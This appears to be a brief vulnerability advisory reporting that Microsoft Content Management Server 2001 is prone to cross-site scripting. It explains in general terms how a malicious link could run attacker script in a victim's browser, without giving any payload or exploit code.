Microsoft Content Management Server 2001 is reported to be prone to cross-site scripting attacks.

An attacker could construct a malicious link to a vulnerable host that contains arbitrary HTML and script code. If this link is visited by a web user, the attacker-supplied code will be rendered in their browser, in the security context of the vulnerable site.
